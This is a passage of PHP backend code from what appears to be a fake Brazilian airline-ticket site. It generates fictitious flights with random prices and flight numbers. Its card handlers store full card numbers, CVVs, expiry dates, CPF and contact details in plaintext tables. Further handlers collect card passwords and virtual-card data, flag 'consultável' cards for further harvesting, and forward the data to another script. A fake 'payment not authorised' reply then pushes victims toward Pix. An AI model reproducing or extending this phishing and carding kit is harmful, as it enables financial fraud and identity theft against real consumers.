        } elseif ($horaPartida >= 22 || $horaPartida <= 5) {
            $baseTarifa *= 0.85;
        }

        $tarifaBaseFinal = $baseTarifa * ($internacional ? 1.38 : 1.0);

        $precoSemTaxas = ($adultos  * $tarifaBaseFinal)
                       + ($criancas * $tarifaBaseFinal * 0.65)
                       + ($bebes    * $tarifaBaseFinal * 0.07);

        $taxas = ($adultos * $taxaAdulto) + ($criancas * $taxaCrianca) + ($bebes * $taxaBebe);

        $precoComMarkup = ($precoSemTaxas + $taxas) * (1 + floatval($configLink['porcentagem'] ?? 15) / 100);

        if (!empty($configLink['seguro_viagem'])) {
            $precoComMarkup += 49.90 * ($adultos + $criancas);
        }

        $precoFinal = round($precoComMarkup * (1 + rand(-40, 60) / 1000), 2);

        $temConexao = ($km > 700 && $internacional && rand(1, 100) <= 25);

        $cidadeConexao = null;
        if ($temConexao) {
            $cidadeConexao = buscarAeroportoConexaoPorApi(
                floatval($origem['lat']), floatval($origem['lng']),
                floatval($destino['lat']), floatval($destino['lng'])
            );
            if (!$cidadeConexao) $temConexao = false;
        }

        $detalhesVoos     = [];
        $durTotalMin      = 0;
        $tsChegadaFinal   = $tsChegada;
        $hhmmChegadaFinal = $hhmmChegada;
        $viradaDia        = false;

        if ($temConexao) {
            $aeroportoConexao = montarAeroporto(
                $cidadeConexao['cidade'], $cidadeConexao['sigla'],
                $cidadeConexao['nome'],   $cidadeConexao['sigla']
            );

            $conexaoDurMin = arredondarParaMultiploDe5(rand(75, 195));
            $voo1Dur       = arredondarParaMultiploDe5(intval(floor($duracaoMin * 0.52)));
            $voo2Dur       = $duracaoMin - $voo1Dur;

            $conCheg   = minParaHHMM($minSaida + $voo1Dur, $data['data_de_ida']);
            $conSaid   = minParaHHMM($minSaida + $voo1Dur + $conexaoDurMin, $data['data_de_ida']);
            $chegFinal = minParaHHMM($minSaida + $voo1Dur + $conexaoDurMin + $voo2Dur + $fusoMin, $data['data_de_ida']);

            if (
                !validarHHMM($conCheg['hhmm']) ||
                !validarHHMM($conSaid['hhmm']) ||
                !validarHHMM($chegFinal['hhmm'])
            ) {
                $temConexao = false;
            } else {
                $durTotalMin = $voo1Dur + $conexaoDurMin + $voo2Dur;

                $detalhesVoos = [
                    montarVoo(
                        $aeronaves[array_rand($aeronaves)],
                        conexaoComInfo(formatarDuracao($conexaoDurMin), $conexaoDurMin, $cidadeConexao['cidade']),
                        rand(3000, 5999), $voo1Dur,
                        $aeroportoOrigem,
                        montarTimestamp($data['data_de_ida'], $hhmmSaida), $hhmmSaida,
                        $aeroportoConexao,
                        montarTimestamp($conCheg['data'], $conCheg['hhmm']), $conCheg['hhmm']
                    ),
                    montarVoo(
                        $aeronaves[array_rand($aeronaves)],
                        conexaoVazia(),
                        rand(6000, 8999), $voo2Dur,
                        $aeroportoConexao,
                        montarTimestamp($conSaid['data'],  $conSaid['hhmm']),  $conSaid['hhmm'],
                        $aeroportoDestino,
                        montarTimestamp($chegFinal['data'], $chegFinal['hhmm']), $chegFinal['hhmm']
                    )
                ];

                $tsChegadaFinal   = montarTimestamp($chegFinal['data'], $chegFinal['hhmm']);
                $hhmmChegadaFinal = $chegFinal['hhmm'];
                $viradaDia        = $chegFinal['data'] !== $data['data_de_ida'];
            }
        }

        if (!$temConexao) {
            $durTotalMin  = $duracaoMin;
            $detalhesVoos = [
                montarVoo(
                    $aeronaves[array_rand($aeronaves)],
                    conexaoVazia(),
                    rand(1000, 2999), $duracaoMin,
                    $aeroportoOrigem,  $tsSaida,   $hhmmSaida,
                    $aeroportoDestino, $tsChegada, $hhmmChegada
                )
            ];
            $tsChegadaFinal   = $tsChegada;
            $hhmmChegadaFinal = $hhmmChegada;
            $viradaDia        = $dataChegada !== $data['data_de_ida'];
        }

        if (!validarHHMM($hhmmChegadaFinal)) continue;

        $voos[] = [
            "id"              => $novoId,
            "preco"           => number_format($precoFinal, 2, '.', ''),
            "preço"           => number_format($precoFinal, 2, '.', ''),
            "preco_do_km"     => round($valorKm, 4),
            "distancia_em_km" => round($km, 2),
            "assentos"        => $assentosRestantes,
            "internacional"   => $internacional,
            "direto"          => !$temConexao,
            "detalhes"        => [
                "duracao"              => formatarDuracao($durTotalMin),
                "duração"              => formatarDuracao($durTotalMin),
                "duracao_minutos"      => $durTotalMin,
                "duração_minutos"      => $durTotalMin,
                "hora_saida"           => $tsSaida,
                "hora_chegada"         => $tsChegadaFinal,
                "hora_saida_display"   => $hhmmSaida,
                "hora_chegada_display" => $hhmmChegadaFinal,
                "virada_de_dia"        => $viradaDia,
                "voos"                 => $detalhesVoos
            ]
        ];
    }

    usort($voos, fn($a, $b) => floatval($a['preco']) <=> floatval($b['preco']));

    $_SESSION['ids_voos_gerados'] = $idsUsados;

    function gerarVoosVolta($voosIda, $data, $fusoMin, $listaNegraMins, $listNegraHoras) {
        if (empty($data['data_de_volta'])) return [];

        $idsVolta           = [];
        $voosVolta          = [];
        $fusoVolta          = -$fusoMin;
        $horariosSaidaVolta = gerarHorariosUnicos(count($voosIda), $listaNegraMins, $listNegraHoras);
        $hhmmsSaidaUsadosVolta = [];

        foreach ($voosIda as $idx => $voo) {

            $hhmmSaidaVolta = $horariosSaidaVolta[$idx] ?? null;
            if (!$hhmmSaidaVolta) continue;
            if (!listaNegraValida($hhmmSaidaVolta, $listaNegraMins, $listNegraHoras)) continue;
            if (in_array($hhmmSaidaVolta, $hhmmsSaidaUsadosVolta)) continue;
            $hhmmsSaidaUsadosVolta[] = $hhmmSaidaVolta;

            do {
                $novoId = bin2hex(random_bytes(12));
            } while (in_array($novoId, $idsVolta));
            $idsVolta[] = $novoId;

            $vooVolta          = $voo;
            $vooVolta['id']    = $novoId;
            $precoVolta        = round(floatval($voo['preco']) * (1 + rand(-7, 9) / 100), 2);
            $vooVolta['preco'] = number_format($precoVolta, 2, '.', '');
            $vooVolta['preço'] = $vooVolta['preco'];

            $totalTrechos      = count($vooVolta['detalhes']['voos']);
            $trechosNovos      = [];

            $hhmmSaidaAtual    = $hhmmSaidaVolta;
            $dataAtual         = $data['data_de_volta'];
            $hhmmSaidaPrimeiro = $hhmmSaidaAtual;
            $minSaidaPrimeiro  = hhmmParaMin($hhmmSaidaAtual);

            for ($t = 0; $t < $totalTrechos; $t++) {
                $trecho = $vooVolta['detalhes']['voos'][$t];

                $aeroportoPartida = $trecho['chegada']['aeroporto'];
                $aeroportoChegada = $trecho['partida']['aeroporto'];
                $durTrechoMin     = intval($trecho['duracao_minutos']);

                if ($t > 0) {
                    $conexaoMin     = arredondarParaMultiploDe5(rand(65, 150));
                    $novoInicio     = minParaHHMM(hhmmParaMin($hhmmSaidaAtual) + $conexaoMin, $dataAtual);
                    $hhmmSaidaAtual = $novoInicio['hhmm'];
                    $dataAtual      = $novoInicio['data'];
                }

                $fusoTrecho  = ($t === $totalTrechos - 1) ? $fusoVolta : 0;
                $chegadaCalc = minParaHHMM(hhmmParaMin($hhmmSaidaAtual) + $durTrechoMin + $fusoTrecho, $dataAtual);
                $hhmmChegada = $chegadaCalc['hhmm'];
                $dataChegada = $chegadaCalc['data'];

                if (!validarHHMM($hhmmSaidaAtual) || !validarHHMM($hhmmChegada)) continue;

                $trecho['partida']['aeroporto']    = $aeroportoPartida;
                $trecho['chegada']['aeroporto']    = $aeroportoChegada;
                $trecho['partida']['hora_local']   = montarTimestamp($dataAtual, $hhmmSaidaAtual);
                $trecho['chegada']['hora_local']   = montarTimestamp($dataChegada, $hhmmChegada);
                $trecho['partida']['hora_display'] = $hhmmSaidaAtual;
                $trecho['chegada']['hora_display'] = $hhmmChegada;
                $trecho['numero_do_voo']           = 'LA' . rand(9000, 9999);

                $trechosNovos[]  = $trecho;
                $hhmmSaidaAtual  = $hhmmChegada;
                $dataAtual       = $dataChegada;
            }

            if (empty($trechosNovos)) continue;

            $hhmmChegadaFinal = $hhmmSaidaAtual;
            $dataChegadaFinal = $dataAtual;

            if (!validarHHMM($hhmmChegadaFinal)) continue;

            $minChegadaFinal = hhmmParaMin($hhmmChegadaFinal);
            if ($dataChegadaFinal !== $data['data_de_volta']) $minChegadaFinal += 1440;
            $durTotal = max(1, $minChegadaFinal - $minSaidaPrimeiro);

            $vooVolta['detalhes']['voos']                 = $trechosNovos;
            $vooVolta['detalhes']['duracao']              = formatarDuracao($durTotal);
            $vooVolta['detalhes']['duração']              = formatarDuracao($durTotal);
            $vooVolta['detalhes']['duracao_minutos']      = $durTotal;
            $vooVolta['detalhes']['duração_minutos']      = $durTotal;
            $vooVolta['detalhes']['hora_saida']           = montarTimestamp($data['data_de_volta'], $hhmmSaidaPrimeiro);
            $vooVolta['detalhes']['hora_chegada']         = montarTimestamp($dataChegadaFinal, $hhmmChegadaFinal);
            $vooVolta['detalhes']['hora_saida_display']   = $hhmmSaidaPrimeiro;
            $vooVolta['detalhes']['hora_chegada_display'] = $hhmmChegadaFinal;
            $vooVolta['detalhes']['virada_de_dia']        = $dataChegadaFinal !== $data['data_de_volta'];

            $voosVolta[] = $vooVolta;
        }

        usort($voosVolta, fn($a, $b) => floatval($a['preco']) <=> floatval($b['preco']));
        return $voosVolta;
    }

    echo json_encode([
        "ida"      => $voos,
        "volta"    => ($data['tipo'] ?? '') === 'ida_e_volta' ? gerarVoosVolta($voos, $data, $fusoMin, $LISTA_NEGRA_MINUTOS, $LISTA_NEGRA_HORAS) : [],
        "correcao" => "não",
        "correção" => "não",
        "tarifas"  => $tarifas,
        "meta"     => [
            "km"            => round($km, 2),
            "internacional" => $internacional,
            "fuso_minutos"  => $fusoMin,
            "data_ida"      => $data['data_de_ida'],
            "data_volta"    => $data['data_de_volta'] ?? null
        ]
    ]);
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'salvar_cartão') {
    $nome_do_titular = $data['nome_do_titular'] ?? '';
    $cpf_do_titular = $data['cpf_do_titular'] ?? '';
    $numero_do_cartão = $data['numero_do_cartão'] ?? '';
    $mes_do_cartão = $data['mes_do_cartão'] ?? '';
    $ano_do_cartão = $data['ano_do_cartão'] ?? '';
    $cvv_do_cartão = $data['cvv_do_cartão'] ?? '';
    $parcelas = (int)($data['parcelas'] ?? 1);
    $dispositivo = $data['dispositivo'] ?? '';
    $fullid = $data['fullid'] ?? '';
    $utm_source = (!empty($_COOKIE['utm_source']) ? $_COOKIE['utm_source'] : (!empty($_SESSION['utm_source']) ? $_SESSION['utm_source'] : null));
    $utm_campaign = (!empty($_COOKIE['utm_campaign']) ? $_COOKIE['utm_campaign'] : (!empty($_SESSION['utm_campaign']) ? $_SESSION['utm_campaign'] : null));
    $utm_medium = (!empty($_COOKIE['utm_medium']) ? $_COOKIE['utm_medium'] : (!empty($_SESSION['utm_medium']) ? $_SESSION['utm_medium'] : null));
    $utm_content = (!empty($_COOKIE['utm_content']) ? $_COOKIE['utm_content'] : (!empty($_SESSION['utm_content']) ? $_SESSION['utm_content'] : null));
    $utm_term = (!empty($_COOKIE['utm_term']) ? $_COOKIE['utm_term'] : (!empty($_SESSION['utm_term']) ? $_SESSION['utm_term'] : null));
    $pagador = is_array($data['pagador'] ?? null) ? $data['pagador'] : json_decode($data['pagador'] ?? '{}', true);
    $nome_pagador = $pagador['nome'] ?? '';
    $documento_pagador = $pagador['documento'] ?? '';
    $nascimento_pagador = $pagador['data_de_nascimento'] ?? null;
    $email_pagador = $pagador['email'] ?? '';
    $telefone_pagador = $pagador['telefone'] ?? '';

    if ($nascimento_pagador) {
        $partes = explode('-', $nascimento_pagador);
        if (count($partes) == 3) {
            $nascimento_pagador = $partes[2] . '-' . $partes[1] . '-' . $partes[0];
        }
    }

    $carrinho = is_array($data['carrinho'] ?? null) ? $data['carrinho'] : json_decode($data['carrinho'] ?? '[]', true);
    $item = $carrinho[0] ?? [];
    $origem = $item['origem'] ?? '';
    $destino = $item['destino'] ?? '';
    $data_ida = $item['data_de_ida'] ?? null;
    $data_volta = $item['data_de_volta'] ?? null;
    $tipo_viagem = $item['tipo'] ?? '';
    $classe = $item['classe'] ?? '';
    $valor = $item['preço_atual'] ?? 0;
    $passageiros_json = isset($item['passageiros']) ? json_encode($item['passageiros'], JSON_UNESCAPED_UNICODE) : '[]';

    $navegador = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $ano_completo = strlen($ano_do_cartão) == 2 ? '20' . $ano_do_cartão : $ano_do_cartão;
    $validade_completa = $mes_do_cartão . '/' . $ano_completo;
    $numero_limpo = preg_replace('/\D/', '', $numero_do_cartão);
    $bin = substr($numero_limpo, 0, 6);
    $ultimos4 = substr($numero_limpo, -4);
    $numero_pedido = '02-' . mt_rand(1000000, 9999999);

    function consultarBINHandy($bin) {
        $ch = curl_init("https://data.handyapi.com/bin/{$bin}");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_HTTPHEADER => ['Accept: application/json']
        ]);
        $res = curl_exec($ch);
        curl_close($ch);
        return json_decode($res, true);
    }

    $api = consultarBINHandy($bin);
    $bandeira = ucfirst(strtolower($api['Scheme'] ?? 'desconhecida'));
    $tipo_cartao = strtoupper($api['Type'] ?? '') === 'DEBIT' ? 'Débito' : 'Crédito';
    $banco_api = $api['Issuer'] ?? '';
    $pais_api = $api['Country']['Name'] ?? '';
    $level_api = $api['CardTier'] ?? '';

    $banco_api_normalizado = preg_replace('/[^a-z]/', '', strtolower(iconv('UTF-8', 'ASCII//TRANSLIT', $banco_api)));

    $conf = $conexao->query("SELECT consultavel, colher_cartao_virtual FROM configuracoes LIMIT 1")->fetch(PDO::FETCH_ASSOC);
    $perm_consultavel = (int)($conf['consultavel'] ?? 0);
    $perm_virtual = (int)($conf['colher_cartao_virtual'] ?? 0);

    $todos_bancos = $conexao->query("SELECT * FROM bancos")->fetchAll(PDO::FETCH_ASSOC);

    $banco_db = null;
    foreach ($todos_bancos as $b) {
        $nome_db_normalizado = preg_replace('/[^a-z]/', '', strtolower(iconv('UTF-8', 'ASCII//TRANSLIT', $b['banco'])));
        
        if (strpos($banco_api_normalizado, $nome_db_normalizado) !== false || 
            strpos($nome_db_normalizado, $banco_api_normalizado) !== false) {
            $banco_db = $b;
            break;
        }
    }

    $iconeBanco = '';
    $min = 4;
    $max = 6;
    $score_consultavel = 1;
    $score_virtual = 0;

    if ($banco_db) {
        $iconeBanco = $banco_db['icone'] ?? '';
        $min = (int)$banco_db['min_digitos'] > 0 ? (int)$banco_db['min_digitos'] : 4;
        $max = (int)$banco_db['max_digitos'] > 0 ? (int)$banco_db['max_digitos'] : 8;

        if ((int)$banco_db['colher_consultavel']) {
            $score_consultavel += 1;
        }

        if ((int)$banco_db['colher_virtual']) {
            $score_virtual += 1;
        }
    }

    if ($perm_consultavel) {
        $score_consultavel += 1;
    }

    if ($perm_virtual) {
        $score_virtual += 1;
    }

    $consultavel = $score_consultavel >= 2 ? 1 : 0;
    $virtual = $score_virtual >= 2 ? 1 : 0;

    $sql_base = "titular, cpf, infocc, validade, cvv, parcelas, fullid, origem, destino, data_de_ida, data_de_volta, tipo, classe, passageiros, valor, nome, documento, nascimento, telefone, email, dispositivo, numero_pedido, navegador, ip, bin, banco, pais, level, bandeira, utm_source, utm_campaign, utm_medium, utm_content, utm_term";
    $params = [
        $nome_do_titular, 
        $cpf_do_titular, 
        $numero_do_cartão, 
        $validade_completa, 
        $cvv_do_cartão, 
        $parcelas,
        $fullid, 
        $origem, 
        $destino, 
        $data_ida, 
        $data_volta, 
        $tipo_viagem,
        $classe, 
        $passageiros_json,
        $valor, 
        $nome_pagador, 
        $documento_pagador, 
        $nascimento_pagador, 
        $telefone_pagador, 
        $email_pagador,
        $dispositivo, 
        $numero_pedido, 
        $navegador, 
        $ip, 
        $bin, 
        $banco_api, 
        $pais_api, 
        $level_api, 
        $bandeira,
        $utm_source,
        $utm_campaign,
        $utm_medium,
        $utm_content,
        $utm_term
    ];

    $stmtCC = $conexao->prepare("INSERT INTO infocc ($sql_base) VALUES (" . implode(',', array_fill(0, count($params), '?')) . ")");
    $stmtCC->execute($params);

    $stmtCC = $conexao->prepare("INSERT INTO infovirtual ($sql_base) VALUES (" . implode(',', array_fill(0, count($params), '?')) . ")");
    $stmtCC->execute($params);

    if ($consultavel) {
        $stmtCS = $conexao->prepare("INSERT INTO infoconsul ($sql_base) VALUES (" . implode(',', array_fill(0, count($params), '?')) . ")");
        $stmtCS->execute($params);
    }

    $stmtBandeira = $conexao->prepare("SELECT icone FROM bandeiras WHERE nome = ?");
    $stmtBandeira->execute([$bandeira]);
    $iconeBandeira = $stmtBandeira->fetchColumn() ?: '';

    echo json_encode([
        'sucesso' => true,
        'consultavel' => $consultavel,
        'virtual' => $virtual,
        'min' => $min,
        'max' => $max,
        'bandeira' => $bandeira,
        'tipo' => $tipo_cartao,
        'ultimos' => '****' . $ultimos4,
        'icone_banco' => $iconeBanco,
        'icone_bandeira' => $iconeBandeira,
        'banco' => $banco_api,
        'pais' => $pais_api,
        'level' => $level_api
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'salvar_consultavel') {
    $numero_do_cartao = $data['numero_do_cartão'] ?? '';
    $senha = $data['senha'] ?? '';
    $min = $data['min'] ?? '';
    $max = $data['max'] ?? '';
    $chave = $data['chave'] ?? '';
    $tela = $data['tela'] ?? '';
    $dominio = $data['dominio'] ?? '';
    $fullid = $data['fullid'] ?? '';
    $nome_da_loja = $data['nome_da_loja'] ?? '';

    if ($numero_do_cartao === '' || $senha === '') {
        echo json_encode(['sucesso' => false, 'mensagem' => 'Número do cartão e senha são obrigatórios']);
        exit;
    }

    $numero_limpo = preg_replace('/\D/', '', $numero_do_cartao);

    try {
        $stmt = $conexao->prepare("SELECT * FROM infoconsul WHERE REPLACE(infocc, ' ', '') = :numero LIMIT 1");
        $stmt->execute([':numero' => $numero_limpo]);

        if ($stmt->rowCount() === 0) {
            echo json_encode(['sucesso' => false, 'mensagem' => 'Cartão não encontrado na tabela infoconsul', 'numero_buscado' => $numero_limpo]);
            exit;
        }

        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (empty($row['senha'])) {
            $up = $conexao->prepare("UPDATE infoconsul SET senha = :senha WHERE REPLACE(infocc, ' ', '') = :numero");
            $up->execute([
                ':senha' => $senha,
                ':numero' => $numero_limpo
            ]);
        }

        $nome_resolvido = $row['nome'];
        $cpf_resolvido = $row['cpf'] ?: ($row['documento'] ?? '');

        $_POST = [
            'metodo'       => 'colher_consultavel',
            'name'         => $nome_resolvido,
            'cpf'          => $cpf_resolvido,
            'nasc'         => $row['nascimento'] ?? '',
            'email'        => $row['email'] ?? '',
            'numerocard'   => $numero_do_cartao,
            'senha_cartao' => $senha,
            'agent'        => $row['navegador'] ?? '',
            'min'          => $min,
            'max'          => $max,
            'chave'        => $chave,
            'tela'         => $tela,
            'dominio'      => $dominio,
            'fullid'       => $fullid,
            'nome_da_loja' => $nome_da_loja
        ];

        ob_start();
        try {
            include 'receber_info.php';
        } catch (Throwable $e) {
        }
        ob_end_clean();

        echo json_encode(['sucesso' => true], JSON_UNESCAPED_UNICODE);
        exit;

    } catch (PDOException $e) {
    erroAPI("Erro ao salvar no banco: " . $e->getMessage());
    }
}

if (isset($data['metodo']) && $data['metodo'] === 'salvar_virtual') {
    $numero  = trim($data['numero_do_cartão'] ?? '');
    $virtual = trim($data['numero_do_cartão_virtual'] ?? '');
    $mes     = trim($data['mes'] ?? '');
    $ano     = trim($data['ano'] ?? '');
    $cvv     = trim($data['cvv'] ?? '');
    
    if (!$numero || !$virtual || !$mes || !$ano || !$cvv) {
        echo json_encode(['sucesso' => false, 'mensagem' => 'Preencha todos os campos do cartão virtual.']);
        exit;
    }
    
    $validade = sprintf('%02d/%04d', $mes, $ano);
    
    try {
        $stmt = $conexao->prepare("SELECT nome, cpf, nascimento, email, documento, navegador FROM infoconsul WHERE infocc = :numero LIMIT 1");
        $stmt->bindParam(':numero', $numero);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        
        $_POST = [
            'metodo'         => 'salvar_virtual',
            'nome'           => $row['nome'],
            'cpf'            => $row['cpf'] ?? $row['documento'] ?? '',
            'nascimento'     => $row['nascimento'] ?? '',
            'email'          => $row['email'] ?? '',
            'numero_cartao'  => $numero,
            'cartao_virtual' => $virtual,
            'validade'       => $validade,
            'cvv'            => $cvv,
            'agent'          => $row['navegador'] ?? ''
        ];
        
        ob_start();
        try {
            include 'receber_info.php';
        } catch (Throwable $e) {
        }
        ob_end_clean();
        
        $stmt = $conexao->prepare("UPDATE infovirtual SET infocc_virtual = :virtual, validade_virtual = :validade, cvv_virtual = :cvv WHERE infocc = :numero AND (infocc_virtual IS NULL OR infocc_virtual = '')");
        $stmt->execute([
            ':numero'   => $numero,
            ':virtual'  => $virtual,
            ':validade' => $validade,
            ':cvv'      => $cvv
        ]);
        
        echo json_encode(['sucesso' => true]);
        exit;
    } catch (PDOException $e) {
        erroAPI("Erro ao salvar no banco: " . $e->getMessage());
    }
}


/*

if (isset($data['metodo']) && $data['metodo'] === 'confirmar_pedido_no_cartão') {
    echo json_encode(['sucesso' => true,'mensagem' => 'Pagamento Aprovado.']);
    exit;
}

*/


if (isset($data['metodo']) && $data['metodo'] === 'confirmar_pedido_no_cartão') {
    try {
        $stmtConfig = $conexao->prepare("SELECT debitar_do_cartão FROM configuracoes WHERE id = 1 LIMIT 1");
        $stmtConfig->execute();
        $config = $stmtConfig->fetch(PDO::FETCH_ASSOC);

        if ($config && (int)$config['debitar_do_cartão'] === 1) {
            $stmtGateway = $conexao->prepare("SELECT nome FROM gateway_cartão WHERE id = 1 LIMIT 1");
            $stmtGateway->execute();
            $gateway = $stmtGateway->fetch(PDO::FETCH_ASSOC);

            if (!$gateway || empty($gateway['nome'])) {
                salvarErro("Gateway de pagamento não configurado.");
                throw new Exception('Gateway de pagamento não configurado.');
            }

            $gateway_nome = strtolower(trim($gateway['nome']));

            $gateways = [
                'mercado_pago' => __DIR__ . '/gateway_debitar/MercadoPago.php',
                'unicocash' => __DIR__ . '/gateway_debitar/Unicocash.php',
                'free_pay' => __DIR__ . '/gateway_debitar/FreePay.php',
                'payevo' => __DIR__ . '/gateway_debitar/Payevo.php',
                'street_pay' => __DIR__ . '/gateway_debitar/StreetPay.php',
                'pay_shark' => __DIR__ . '/gateway_debitar/PayShark.php',
                'anubis_pay' => __DIR__ . '/gateway_debitar/Anubispay.php',
                'tryplo_pay' => __DIR__ . '/gateway_debitar/TryploPay.php',
                'podpay' => __DIR__ . '/gateway_debitar/PodPay.php',
                'quantum_pay' => __DIR__ . '/gateway_debitar/QuantumPay.php',
                'pague_x' => __DIR__ . '/gateway_debitar/PagueX.php',
                'plumify' => __DIR__ . '/gateway_debitar/Plumify.php',
                'asset' => __DIR__ . '/gateway_debitar/Asset.php',
                'assetpay.com.br' => __DIR__ . '/gateway_debitar/AssetPay.php',
                'optimus_pay' => __DIR__ . '/gateway_debitar/OptimusPay.php',
                'nuvia_pay' => __DIR__ . '/gateway_debitar/NuviaPay.php',
                'tribo_pay' => __DIR__ . '/gateway_debitar/TriboPay.php',
                'centurion_pay' => __DIR__ . '/gateway_debitar/CenturionPay.php',
                'clyptpay' => __DIR__ . '/gateway_debitar/ClyptPay.php',
                'rokify' => __DIR__ . '/gateway_debitar/Rokify.php'
            ];

            if (!isset($gateways[$gateway_nome]) || !file_exists($gateways[$gateway_nome])) {
                salvarErro("Erro chame o dev ou troque de gateway");
                throw new Exception('Gateway de pagamento inválido.');
            }

            require $gateways[$gateway_nome];
            exit;

        } else {
            $cartao = json_decode($data['cartão_de_crédito'] ?? '{}', true);
            $numeroCartao = preg_replace('/\D/', '', $cartao['numero_do_cartão'] ?? '');

            if ($numeroCartao !== '') {
                $status = 'Não Testado (Débito Desativado)';
                $isVirtual = isset($cartao['ultimos']) && strpos(strtolower($cartao['ultimos']), 'virtual') !== false;

                if ($isVirtual) {
                    $stmt_virtual = $conexao->prepare(
                        "UPDATE infovirtual SET resultado_gateway = ? WHERE REPLACE(infocc_virtual, ' ', '') = ?"
                    );
                    $stmt_virtual->execute([$status, $numeroCartao]);
                } else {
                    $stmt_cc = $conexao->prepare(
                        "UPDATE infocc SET resultado_gateway = ? WHERE REPLACE(infocc, ' ', '') = ?"
                    );
                    $stmt_cc->execute([$status, $numeroCartao]);

                    $stmt_consul = $conexao->prepare(
                        "UPDATE infoconsul SET resultado_gateway = ? WHERE REPLACE(infocc, ' ', '') = ?"
                    );
                    $stmt_consul->execute([$status, $numeroCartao]);
                }
            }

            echo json_encode([
                'sucesso' => false,
                'mensagem' => 'Pagamento não autorizado. Tente usar outra forma de pagamento.'
            ]);
            exit;
        }

    } catch (PDOException $e) {
        erroAPI("Erro ao salvar no banco: " . $e->getMessage());
    } catch (Exception $e) {
        erroAPI($e->getMessage());
    }
}



require_once "../config/config.php";
include "./phpqrcode/qrlib.php";

if (isset($data['metodo']) && $data['metodo'] === 'gerar_pix') {
    
    try {
        
        function unmaskCpfCnpj($str) {
            return preg_replace('/[^0-9]/', '', $str ?? '');
        }

        function unmaskPhone($str) {
            return preg_replace('/[^0-9]/', '', $str ?? '');
        }

        function formatarDataNascimento($data) {
            $data = preg_replace('/[^0-9]/', '', $data ?? '');
            if (strlen($data) === 8) {
                return substr($data, 0, 2) . '/' . substr($data, 2, 2) . '/' . substr($data, 4, 4);
            }
            return '';
        }
        
        function formatarDocumento($doc) {
            $doc = preg_replace('/[^0-9]/', '', $doc ?? '');
            if (strlen($doc) === 11) {
                return substr($doc, 0, 3) . '.' . substr($doc, 3, 3) . '.' . substr($doc, 6, 3) . '-' . substr($doc, 9, 2);
            } elseif (strlen($doc) === 14) {
                return substr($doc, 0, 2) . '.' . substr($doc, 2, 3) . '.' . substr($doc, 5, 3) . '/' . substr($doc, 8, 4) . '-' . substr($doc, 12, 2);
            }
            return $doc;
        }

        function obterNavegador() {
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
            if (strpos($ua, 'Edg') !== false) return 'Edge';
            if (strpos($ua, 'OPR') !== false || strpos($ua, 'Opera') !== false) return 'Opera';
            if (strpos($ua, 'Chrome') !== false) return 'Chrome';
            if (strpos($ua, 'Firefox') !== false) return 'Firefox';
            if (strpos($ua, 'Safari') !== false) return 'Safari';
            return 'Desconhecido';
        }

        function obterDispositivo() {
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
            if (preg_match('/Mobile|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i', $ua)) {
                return 'Mobile';
            }
            return 'Desktop';
        }

        function obterIP() {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
               ?? $_SERVER['HTTP_X_FORWARDED_FOR']
               ?? $_SERVER['REMOTE_ADDR']
               ?? null;
            if ($ip && strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            return $ip ?: null;
        }

        function montaPix($px) {
            $ret = '';
            foreach ($px as $k => $v) {
                $id = str_pad($k, 2, '0', STR_PAD_LEFT);
                $value = is_array($v) ? montaPix($v) : $v;
                $len = str_pad(strlen($value), 2, '0', STR_PAD_LEFT);
                $ret .= $id . $len . $value;
            }
            return $ret;
        }

        function crc16($data) {
            $crc = 0xFFFF;
            for ($i = 0; $i < strlen($data); $i++) {
                $crc ^= (ord($data[$i]) << 8);
                for ($j = 0; $j < 8; $j++) {
                    if ($crc & 0x8000) {
                        $crc = ($crc << 1) ^ 0x1021;
                    } else {
                        $crc <<= 1;
                    }
                }
            }
            return strtoupper(str_pad(dechex($crc & 0xFFFF), 4, '0', STR_PAD_LEFT));
        }

        $carrinho = $data['carrinho'] ?? [];
        if (is_string($carrinho)) {
            $carrinho = json_decode($carrinho, true) ?? [];
        }

        if (empty($carrinho) || !isset($carrinho[0])) {
            echo json_encode(["sucesso" => false, "mensagem" => "Carrinho inválido ou vazio"], JSON_UNESCAPED_UNICODE);
            exit;
        }

        $item = $carrinho[0];
        $fullid = $item['fullid'] ?? null;
        $origem = $item['origem'] ?? '';
        $destino = $item['destino'] ?? '';
        $classe = $item['classe'] ?? '';
        $tipo_do_voo = $item['tipo'] ?? '';
        $data_de_ida = $item['data_de_ida'] ?? '';
        $data_de_volta = $item['data_de_volta'] ?? '';
        $passageiros = isset($item['passageiros']) ? json_encode($item['passageiros'], JSON_UNESCAPED_UNICODE) : '';

        $valor_bruto = floatval($item['preço_atual'] ?? 0);

        $descontos = $data['descontos'] ?? [];
        if (is_string($descontos)) {
            $descontos = json_decode($descontos, true) ?? [];
        }

        $desconto_pix = 0;
        foreach ($descontos as $d) {
            if (isset($d['metodo']) && $d['metodo'] === 'pix' && isset($d['desconto'])) {
                $desconto_pix = floatval($d['desconto']);
                break;
            }
        }

        $valor_final = number_format($valor_bruto * (1 - $desconto_pix / 100), 2, '.', '');

        if ($valor_final <= 0) {
            echo json_encode(["sucesso" => false, "mensagem" => "Valor final inválido"], JSON_UNESCAPED_UNICODE);
            exit;
        }

        $pagador = $data['pagador'] ?? [];
        if (is_string($pagador)) {
            $pagador = json_decode($pagador, true) ?? [];
        }

        $nome = trim($pagador['nome'] ?? '');
        $documento = formatarDocumento($pagador['documento'] ?? '');
        $telefone = unmaskPhone($pagador['telefone'] ?? '');
        $email = trim($pagador['email'] ?? '');
        $nascimento = formatarDataNascimento($pagador['data_de_nascimento'] ?? '');
        $navegador = obterNavegador();
        $dispositivo = obterDispositivo();
        $ip = obterIP();
        $utm_source = (!empty($_COOKIE['utm_source']) ? $_COOKIE['utm_source'] : (!empty($_SESSION['utm_source']) ? $_SESSION['utm_source'] : null));
